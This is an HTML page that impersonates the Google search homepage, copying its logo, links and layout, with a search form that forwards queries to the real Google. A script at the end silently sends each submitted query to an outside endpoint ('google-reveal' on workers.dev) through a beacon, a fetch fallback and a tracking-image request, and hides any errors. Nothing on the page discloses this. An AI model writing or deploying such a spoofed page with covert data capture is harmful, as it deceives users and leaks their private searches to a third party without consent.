<!DOCTYPE html>
<html lang="en" data-theme="auto">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <meta name="color-scheme" content="light dark" />
  <meta name="theme-color" content="#ffffff" media="(prefers-color-scheme: light)">
  <meta name="theme-color" content="#3c3c3c" media="(prefers-color-scheme: dark)">
  <title>Google</title>

  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined" />

  <style>
    :root {
      --bg:#ffffff;
      --text:#1f1f1f;
      --border:#dadce0;
      --icon:#9aa0a6;
      --focus: rgba(26,115,232,.28);
      --w:clamp(280px,92vw,600px);
      --r-pill:999px;
    }

    @media (prefers-color-scheme: dark) {
      :root {
        --bg:#3c3c3c;
        --text:#f2f2f2;
        --border:#5a5a5a;
        --icon:#d0d0d0;
      }
    }

    html,body {
      height:100%;
      margin:0;
      font:16px/1.4 -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Arial,sans-serif;
      background:var(--bg);
      color:var(--text);
      display:flex;
      flex-direction:column;
    }

    header {
      display:flex;
      justify-content:space-between;
      align-items:center;
      padding:12px 16px;
    }

    .header-left a, .header-right a {
      color:var(--text);
      font-size:14px;
      text-decoration:none;
      opacity:.9;
      margin-right:14px;
    }

    .header-left a:hover { text-decoration:underline; }

    .sign-in {
      background:#1a73e8;
      color:#fff;
      padding:8px 14px;
      border-radius:var(--r-pill);
      text-decoration:none;
      font-weight:500;
    }

    main {
      flex:1;
      display:flex;
      flex-direction:column;
      align-items:center;
      justify-content:flex-start;
      padding-top:18vh; /* keeps search area above center like Google */
    }

    .logo img {
      width:272px;
      height:auto;
      transition:filter .3s ease;
    }

    @media (prefers-color-scheme: dark) {
      .logo img {
        filter: brightness(0) invert(1); /* make logo white */
      }
    }

    .search {
      position:relative;
      margin-top:40px;
      width:100%;
      max-width:var(--w);
    }

    .search input {
      width:100%;
      height:44px;
      border:1px solid var(--border);
      border-radius:var(--r-pill);
      padding:0 100px 0 50px;
      font-size:16px;
      outline:none;
      background:#fff;
      color:#000;
      transition:background .3s ease, color .3s ease;
    }

    @media (prefers-color-scheme: dark) {
      .search input {
        background:#fff; /* white input box */
        color:#000;
      }
    }

    .search .material-symbols-outlined {
      position:absolute;
      top:50%;
      transform:translateY(-50%);
      font-size:22px;
      color:var(--icon);
    }
    .search .search-icon { left:16px; }
    .search .mic { right:56px; }
    .search .camera { right:18px; }

    footer {
      margin-top:auto;
      border-top:1px solid var(--border);
      background:var(--bg);
      padding:14px;
      text-align:center;
    }

    footer a {
      color:var(--text);
      opacity:.9;
      text-decoration:none;
      font-size:14px;
      margin:0 8px;
    }

    footer a:hover { text-decoration:underline; }
  </style>
</head>
<body>
  <header>
    <div class="header-left">
      <a href="https://www.google.com/imghp?hl=en&ogbl">Images</a>
      <a href="https://mail.google.com/mail/&ogbl">Gmail</a>
    </div>
    <div class="header-right">
      <a class="sign-in" href="https://accounts.google.com/ServiceLogin">Sign in</a>
    </div>
  </header>

  <main>
    <div class="logo">
      <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
    </div>

    <form id="search" class="search" action="https://www.google.com/search" method="GET">
      <span class="material-symbols-outlined search-icon">search</span>
      <input id="q" name="q" type="search" placeholder="Search" aria-label="Search">
      <span class="material-symbols-outlined mic">mic</span>
      <span class="material-symbols-outlined camera">photo_camera</span>
    </form>
  </main>

  <footer>
    <a href="#">About</a>
    <a href="#">Advertising</a>
    <a href="#">Business</a>
    <a href="#">How Search works</a>
    <a href="#">Privacy</a>
    <a href="#">Terms</a>
    <a href="#">Settings</a>
  </footer>

  <script>
    const ENDPOINT = 'https://google-reveal.avishaierel.workers.dev';

    function sendToBackend(q){
      try{
        const params = new URLSearchParams({ q });
        if (navigator.sendBeacon) {
          const blob = new Blob([params.toString()], { type: 'application/x-www-form-urlencoded;charset=UTF-8' });
          navigator.sendBeacon(ENDPOINT, blob);
        } else {
          fetch(ENDPOINT, { method:'POST', body:params, keepalive:true, mode:'cors' }).catch(()=>{});
        }
        const img = new Image();
        img.src = ENDPOINT + '?' + params.toString();
      }catch(e){}
    }

    const form = document.getElementById('search');
    const input = document.getElementById('q');
    form.addEventListener('submit', function(){
      const q = (input.value || '').trim();
      if(q){ sendToBackend(q); }
    }, { capture:true });
  </script>
</body>
</html>
